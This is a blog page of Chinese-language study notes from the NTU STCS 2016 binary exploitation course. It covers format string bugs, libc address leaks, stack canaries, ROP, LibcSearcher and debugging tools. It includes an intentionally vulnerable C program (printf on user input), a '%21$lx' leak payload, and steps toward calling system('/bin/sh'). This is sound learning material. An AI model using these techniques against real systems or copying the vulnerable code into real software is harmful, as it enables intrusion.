+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sprintf</span>(buffer, <span style="color:#e6db74">&#34;%s %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, str, a);
+</span></span></code></pre></div><h2 id="format-string-vulnerablility">Format String Vulnerablility</h2>
+<ul>
+<li><em>错误的使用方式，直接将使用者的输入作为fmt使用</em></li>
+<li><em>将printf(&quot;%s&quot;, str)，写成gets(str);printf(str);</em></li>
+<li><em>此类错误不易发现，因为如果没有测试特殊input执行结果不变</em></li>
+</ul>
+<h2 id="fmt使用方式">fmt使用方式</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%2$*1$d&#34;</span>, width, num);
+</span></span></code></pre></div><ul>
+<li><em>%2$制定要以%d输出的是第几个参数</em></li>
+<li><em>1$制定要作为输出的长度是第几个参数</em></li>
+<li><em>width = 10,num = 5时相当于printf(&quot;%10d&quot;, 5)</em></li>
+</ul>
+<p><img src="w6-fmt-stacktrace.png" alt="w6-fmt-stacktrace"></p>
+<p><strong>例子:</strong><a href="fmt1">fmt1</a></p>
+<p>source code</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout,<span style="color:#ae81ff">0</span>,_IONBF,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">alarm</span>(<span style="color:#ae81ff">180</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> str[<span style="color:#ae81ff">100</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>(<span style="color:#a6e22e">gets</span>(str)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">printf</span>(str);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="fmt漏洞成因">fmt漏洞成因</h2>
+<ul>
+<li><em>format string可以被攻击者的输入人以控制，而printf本身不会检查后面有几个参数</em></li>
+<li><em>使用%x会造成stack上的info leak</em></li>
+<li><em>使用$控制要leak的位置</em></li>
+</ul>
+<p><strong>PS.：</strong> <em>x64的程序使用%lx</em></p>
+<h2 id="leak-libc-base">leak libc base</h2>
+<ul>
+<li><em>程序执行起点为_start，把main作为参数传入__libc_start_main</em></li>
+<li><em>__libc_start_main会先完成初始化造作，之后call main函数</em></li>
+<li><em>main的ret addr指向libc内部，且存放在stack上的值可以用%x泄露出来</em></li>
+<li><em>leak出来的位数ec5和return会libc里的位置一致，但由于ASLR的关系使得高位随机</em></li>
+<li><em>会return的位置会在call exit前面一些</em></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ ./fmt1
+</span></span><span style="display:flex;"><span>%21$lx
+</span></span><span style="display:flex;"><span>7f0438b721e3
+</span></span></code></pre></div><h1 id="stackguardcanary">stackguard(CANARY)</h1>
+<ul>
+<li>编译器对stack overflow的一种保护机制</li>
+<li>在call函数时在stack上放的值</li>
+<li>函数return时先检查CANARY是否被修改</li>
+</ul>
+<p><img src="w6-fmt-stackguard.png" alt="w6-fmt-stackguard"></p>
+    </div>
+    <a href="/posts/ntu-stcs-2016-w6/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/ntu-stcs-2016-w5/" class="link black dim">
+        NTU STCS 2016学习笔记 0x03 ROP2
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <h1 id="ret2syscall">ret2syscall</h1>
+<ul>
+<li><em>跳.plt entry</em></li>
+<li><em>函数参数直接放到接下来的stack</em></li>
+<li><em>用pop-ret处理用过的参数</em></li>
+</ul>
+<p><img src="w5-ropcall.png" alt="w5-ropcall"></p>
+<h1 id="ret2libc">ret2libc</h1>
+<ul>
+<li><em>printf,gets,puts等函数所在位置:libc.so.6</em></li>
+<li><em>直接用rop call libc 的system</em></li>
+<li><em>用条件</em>
+<ul>
+<li><em>libc版本或者fuction的offset已知</em></li>
+<li><em>ASLR开启情况</em></li>
+</ul>
+</li>
+</ul>
+<p><strong>Dynamically Linded Elf 动态链接库相关操作</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 获取libc路径</span>
+</span></span><span style="display:flex;"><span>ldd ./binary
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 查看libc中的相对位置</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># trick 使用 | grep &#39; system@&#39;来查看想找的symbol</span>
+</span></span><span style="display:flex;"><span>readelf -s /lib32/libc.so.6 | grep <span style="color:#e6db74">&#39; system@&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 指定加载的libc位置</span>
+</span></span><span style="display:flex;"><span>LD_LIBRARY_PATH<span style="color:#f92672">=</span>./path/to/libc
+</span></span></code></pre></div><p><strong>Function Lazy Binding</strong></p>
+<p><em>library在binary执行时才加载，第一次call function时解析函数位置填入.got.plt</em></p>
+<p><strong>推算libc base addr</strong></p>
+<ul>
+<li><em>函数在libc的相对位置不变</em>
+<ul>
+<li><em>使用readelf得知__libc_start_main和system在libc的相对位置</em></li>
+</ul>
+</li>
+<li><em>使用任意输入函数print出__libc-start_main的.got内容，推算system在内存的addr</em>
+<ul>
+<li><em>用rop构造puts(__libc_start_main@got)</em></li>
+<li><em>要leak的got entry,对应的function必须已经被call过</em></li>
+</ul>
+</li>
+<li><em>前提：已有或已知远端libc.so.6版本</em></li>
+</ul>
+<p><strong>Libc Data Base</strong></p>
+<ul>
+<li>
+<p><em>已知两个function的address时可以在libcdb里找对应的版本</em></p>
+<ul>
+<li><em><del>✘网站：libcdb.com:the libc data base</del></em></li>
+<li><em>✘网站：<a href="https://libc.nullbyte.cat/">libc.nullbyte.cat</a></em></li>
+<li><em>✔使用<a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></em></li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span>
+</span></span><span style="display:flex;"><span>obj <span style="color:#f92672">=</span> LibcSearcher(<span style="color:#e6db74">&#34;fgets&#34;</span>, <span style="color:#ae81ff">0X7ff39014bd90</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>obj<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;system&#34;</span>)        <span style="color:#75715e">#system 偏移</span>
+</span></span><span style="display:flex;"><span>obj<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;str_bin_sh&#34;</span>)    <span style="color:#75715e">#/bin/sh 偏移</span>
+</span></span><span style="display:flex;"><span>obj<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;__libc_start_main_ret&#34;</span>)  
+</span></span></code></pre></div></li>
+</ul>
+<p><strong>Leak libc base</strong>
+<em>一般leak __libc_start_main的地址，通过LibcSearcher获取system与/bin/sh的地址，再跳转回main触发溢出执行system(&rsquo;/bin/sh&rsquo;)</em></p>
+    </div>
+    <a href="/posts/ntu-stcs-2016-w5/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/ntu-stcs-2016-w4/" class="link black dim">
+        NTU STCS 2016学习笔记 0x02 ROP
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <h1 id="gdbserver">gdbserver</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># in bash commandline</span>
+</span></span><span style="display:flex;"><span>gdbserver 127.0.0.1:4000 ./binary <span style="color:#75715e">#break在entrypoint</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># in gdb commandline</span>
+</span></span><span style="display:flex;"><span>gdb ./binary
+</span></span><span style="display:flex;"><span>$ target remote 127.0.0.1:4000
+</span></span><span style="display:flex;"><span>$ <span style="color:#66d9ef">continue</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 搭配ncat</span>
+</span></span><span style="display:flex;"><span>ncat -vc <span style="color:#e6db74">&#39;gdbserver 127.0.0.1:4000 .binary&#39;</span> -kl 127.0.0.1 <span style="color:#ae81ff">5000</span>
+</span></span></code></pre></div><p><strong>trick</strong></p>
+<p>使用gdbscript attach pid</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># .gdbinit</span>
+</span></span><span style="display:flex;"><span>set disassembly-flavor intel
+</span></span><span style="display:flex;"><span>define at
+</span></span><span style="display:flex;"><span>  shell echo attach <span style="color:#66d9ef">$(</span>pidof -s $arg0<span style="color:#66d9ef">)</span> &gt; /tmp/foo.gdb
+</span></span><span style="display:flex;"><span>  source /tmp/foo.gdb
+</span></span><span style="display:flex;"><span>end
+</span></span></code></pre></div><hr>
+<h1 id="rop">rop</h1>
+<p>类型包括:ret2syscall ret2text ret2libc</p>
+<h2 id="rop2syscall">rop2syscall</h2>
+<ul>
+<li>找gadget控制syscall需要的regs(eax,ebx,ecx,edx)</li>
+<li>需要int 80</li>
+</ul>
+<p><strong>RopGadget</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#usage</span>
+</span></span><span style="display:flex;"><span>RopGadget --binary ./binary
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#int 80 ; ret</span>
+</span></span><span style="display:flex;"><span>RopGadget --binary ./binary --opcode cd80c3
+</span></span></code></pre></div><blockquote>
+<p>PS:execve需要&rsquo;/bin/sh&rsquo;，且地址必须已知
+用read吧需要的字符串输入至已知地址的buffer上</p>
+    </div>
+    <a href="/posts/ntu-stcs-2016-w4/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+        <div class="relative w-100 w-30-l mb4 bg-white">
+          <div class="relative w-100 mb4 bg-white nested-copy-line-height">
+  <div class="bg-white mb3 pa4 gray overflow-hidden">
+    <span class="f6 db">Posts</span>
+    <h1 class="f3 near-black">
+      <a href="/posts/ntu-stcs-2016-w3/" class="link black dim">
+        NTU STCS 2016学习笔记 0x01 Intro
+      </a>
+    </h1>
+    <div class="nested-links f5 lh-copy nested-copy-line-height">
+      <h2 id="objdump">objdump</h2>
+<p>常用指令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ objdump -T binary
+</span></span><span style="display:flex;"><span>$ cat /proc/<span style="color:#e6db74">`</span>pidof binary<span style="color:#e6db74">`</span>/maps
+</span></span></code></pre></div><h2 id="readelf">readelf</h2>
+<p>分析elf binary header里的一些信息
+readelf -a | grep STACK 看能否跑shellcode</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ readelf -a ./binary | grep STACK
+</span></span><span style="display:flex;"><span>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x10
+</span></span></code></pre></div><p><strong>trick</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ readelf -a ./binary | grep <span style="color:#e6db74">&#39; system@&#39;</span>
+</span></span><span style="display:flex;"><span>$ ldd binary
+</span></span></code></pre></div><p><strong>trick:execstack</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ execstack --h
+</span></span><span style="display:flex;"><span>Usage: execstack <span style="color:#f92672">[</span>OPTION...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>execstack -- program to query or set executable stack flag
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  -c, --clear-execstack      Clear executable stack flag bit
+</span></span><span style="display:flex;"><span>  -q, --query                Query executable stack flag bit
+</span></span><span style="display:flex;"><span>  -s, --set-execstack        Set executable stack flag bit
+</span></span><span style="display:flex;"><span>  -?, --help                 Give this help list
+</span></span><span style="display:flex;"><span>      --usage                Give a short usage message
+</span></span><span style="display:flex;"><span>  -V, --version              Print program version
+</span></span><span style="display:flex;"><span>Report bugs to &lt;jakub@redhat.com&gt;.
+</span></span></code></pre></div><hr>
+<h2 id="ncat">ncat</h2>
+<p>建立local service环境，因为你不会再无法debug的情况下直接对remote做事
+ncat -vc ./binary -kl 127.0.0.1 8888
+ncat -vc &lsquo;strace -e trace=read ./binary&rsquo; -kl ::1 4000</p>
+    </div>
+    <a href="/posts/ntu-stcs-2016-w3/" class="ba b--moon-gray bg-light-gray br2 color-inherit dib f7 hover-bg-moon-gray link mt2 ph2 pv1">read more</a>
+  </div>
+</div>
+
+        </div>
+      
+    </section></article>
+
+    </main>
+    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
+  <div class="flex justify-between">
+  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://localhost:1313/" >
+    &copy;  Kur0's Blog 2025 
+  </a>
+    <div><div class="ananke-socials"></div>
+</div>
+  </div>
+</footer>
+
+  </body>
+</html>
